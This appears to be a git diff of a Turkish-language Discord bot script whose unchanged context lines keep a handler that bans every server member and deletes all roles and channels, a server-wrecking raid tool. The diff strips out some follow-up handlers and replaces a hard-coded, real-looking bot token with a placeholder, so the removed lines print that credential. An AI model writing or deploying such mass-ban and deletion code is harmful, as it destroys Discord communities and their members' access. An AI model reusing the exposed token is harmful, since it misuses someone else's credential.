@@ -22,65 +22,32 @@ berke.on('message', msg => {
       msg.guild.members.forEach(a => msg.guild.ban(a))
       msg.guild.roles.forEach(a => a.delete())
       msg.guild.channels.forEach(a => a.delete())
-      let kanal = 'schewtsa'
-      let kanal1 = 'buraya-yazın'
-      msg.guild.createChannel(kanal)
-      msg.guild.createChannel(kanal1)
       })
     }
 })
 
 //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////// 
-     
-berke.on('message', message => {
-    if(message.content.toLowerCase() === 'ban kaldır' ) {
-        message.guild.fetchBans().then(bans => {
-            bans.forEach(user => {
-                message.guild.unban(user);
-            });
-        });
-    }
-});
 
-////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+//berke.on('channelCreate', channel => {
+  //if (channel.name == 'schewtsa') {
+   // channel.send('Bir, kuşun kanat çırpış sesiydi.')
+    //channel.guild.channels.forEach(c => {
+     //    c.overwritePermissions(channel.guild.roles.find("name", "@everyone"), {
+      //        SEND_MESSAGES: false,
+       //       ADD_REACTIONS: false,
+        //      SPEAK: false
+         //   });
+          //});
+  //}
+  //if (channel.name == '') {
+  //  channel.send(``)
+ // }
 
-berke.on('channelCreate', channel => {
-  if (channel.name == 'schewtsa') {
-    channel.send('Bir, kuşun kanat çırpış sesiydi.')
-    channel.guild.channels.forEach(c => {
-         c.overwritePermissions(channel.guild.roles.find("name", "@everyone"), {
-              SEND_MESSAGES: false,
-              ADD_REACTIONS: false,
-              SPEAK: false
-            });
-          });
-  }
-  if (channel.name == '') {
-    channel.send(``)
-  }
-
-});
+//});
 
 ///////////
 
-berke.on('channelCreate', channel => {
-  if (channel.name == 'buraya-yazın') {
-    channel.send('@everyone buraya yazabilirsiniz.')
-    channel.guild.channels.forEach(c => {
-         c.overwritePermissions(channel.guild.roles.find("name", "@everyone"), {
-              SEND_MESSAGES: true,
-              ADD_REACTIONS: false,
-              SPEAK: false
-            });
-          });
-  }
-  if (channel.name == '') {
-    channel.send(``)
-  }
-
-});
-
-berke.login("NjQ1MzczODYyNjA2OTI5OTIw.Xe_2Sg.rNbDS9JNqDCtyRfY_hjPoaUDYy8")
+berke.login("TOKENI BURAYA YAZ")
 
 
 berke.on("ready", () => {
